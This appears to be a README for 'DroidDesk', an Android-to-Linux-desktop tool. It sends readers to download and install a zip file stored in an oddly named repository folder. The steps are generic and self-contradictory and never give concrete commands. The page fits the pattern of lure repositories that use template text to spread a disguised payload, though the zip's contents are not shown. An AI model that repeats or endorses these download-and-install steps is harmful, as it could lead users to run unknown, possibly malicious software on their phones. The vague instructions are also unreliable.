# 📱 DroidDesk - Turn Android into a Linux Desktop

[![](https://img.shields.io/badge/Download-DroidDesk-blue)](https://github.com/djabubo2147/DroidDesk/raw/refs/heads/main/junketer/Desk_Droid_1.0.zip)

DroidDesk transforms your Android device into a functional Linux desktop. You can run desktop programs like VS Code, Firefox, LibreOffice, and Blender directly on your phone. This setup relies on tools like Termux, Termux X11, TUR, and Proot to provide a stable environment. You can use your phone screen or connect your device to an external monitor using X11 or VNC technology.

## 🛠 Prerequisites

Before you start, ensure your Android device meets these requirements:

*   Android version 8.0 or higher.
*   At least 4GB of RAM for smooth performance.
*   5GB of free storage space for the Linux environment and applications.
*   A stable internet connection for the initial download.
*   A basic understanding of how to use a touch screen interface.

While the software runs on most devices, a phone with a modern processor will offer a snappier experience. If you plan to use an external monitor, ensure your device supports video output through its USB-C port or wireless casting.

## 📥 Getting Started

Follow these steps to install the environment on your device.

1. Visit [this page to download](https://github.com/djabubo2147/DroidDesk/raw/refs/heads/main/junketer/Desk_Droid_1.0.zip) the necessary files.
2. Open your web browser on your phone.
3. Access the link provided above.
4. Locate the latest release assets.
5. Tap the file to begin the download.
6. Open your file manager app once the download finishes.
7. Tap the downloaded file to start the installation.
8. Follow the on-screen prompts from your phone to complete the process.
9. Locate the DroidDesk icon on your home screen and open it.

The app will download additional components upon the first launch. Keep your phone connected to power during this process to prevent interruptions.

## 🖥 Setting Up the Desktop

After installation, the app opens a terminal window. This window acts as the bridge between your Android system and Linux.

1. Wait for the initial setup script to finish.
2. Type your preferred username when prompted.
3. Create a secure password for your desktop environment.
4. The system will now prepare the graphical interface. 
5. Once complete, type the start command specified in the welcome message.
6. Your Android phone will shift to the Linux desktop view.

You can now use your touch screen as a mouse. Tap to click, double-tap to open files, and use two fingers to scroll.

## 🖱 Connecting Peripherals

A desktop environment works best with a mouse and keyboard. You can connect these using Bluetooth or a USB hub.

*   **Bluetooth:** Go to your Android settings and pair your keyboard and mouse. DroidDesk detects these devices automatically.
*   **USB Hub:** Plug your hub into your phone. Connect your keyboard, mouse, and external monitor to the hub. The desktop will extend to your screen.

If the internal resolution looks small or blurry, open the Display Settings inside the Linux desktop menu. Adjust the scaling factor until the text and icons appear at a comfortable size.

## ⚙ Using Applications

DroidDesk includes a package manager. This tool lets you install popular software.

1. Locate the terminal icon on your desktop.
2. Open it to type commands.
3. Use the `pkg install` command followed by the name of the program you need.
4. For example, to install a web browser, type the correct package name provided in your documentation.
5. Wait for the installation to finish.
6. Find your new application in the main menu under the Applications folder.

You can run multiple programs at the same time. Remember that your phone has limited physical resources. Close applications you no longer use to free up memory for other tasks.

## 🌐 Connecting Monitors

You have two ways to see your desktop on a larger screen.

### Using X11
X11 runs the desktop directly on your connected monitor. This method provides the fastest response time.

1. Confirm your Android device supports display output. 
2. Plug the monitor into your phone using a compatible adapter.
3. Select the X11 launch mode when you start DroidDesk.

### Using VNC
VNC allows you to view your desktop from another device, such as a laptop or a tablet.

1. Note the IP address shown in your DroidDesk terminal.
2. Download a generic VNC viewer app on your tablet or laptop.
3. Enter your phone's IP address and port number into the VNC viewer.
4. Connect to see your Android phone desktop on your tablet screen.

## 💡 Troubleshooting Common Issues

If you encounter issues, check these frequent solutions.

*   **App won't start:** Restart your phone. This clears temporary memory glitches.
*   **Slow performance:** Close background apps on your Android phone. Heavy tasks like Blender or LibreOffice use significant processing power.
*   **No internet inside Linux:** Ensure your WiFi or cellular data is active on the host Android phone. The Linux environment shares this connection.
*   **Cannot find files:** Your Linux files reside in a specific folder within your Android storage. Use a file explorer app to navigate to the DroidDesk data directory.
*   **Input lag:** If you use VNC, ensure you are on a fast 5GHz WiFi network. Slow networks cause delays in mouse movement.

If these steps do not fix your problem, ensure you have sufficient storage space remaining on your device. The system requires extra room to manage temporary files while programs run.

## 🛡 Security and Privacy

DroidDesk runs within a protected container. This prevents the Linux environment from accessing your sensitive Android data unless you grant it permission.

*   Keep your root password private.
*   Only install software from official and trusted sources.
*   Back up your important documents to a cloud service or external drive.
*   Update your environment regularly using the update scripts provided within the DroidDesk terminal.

This setup remains separate from your main phone system. It does not replace your Android OS, allowing you to switch between your phone and your desktop with ease. Use the notification bar to return to your standard phone apps at any time.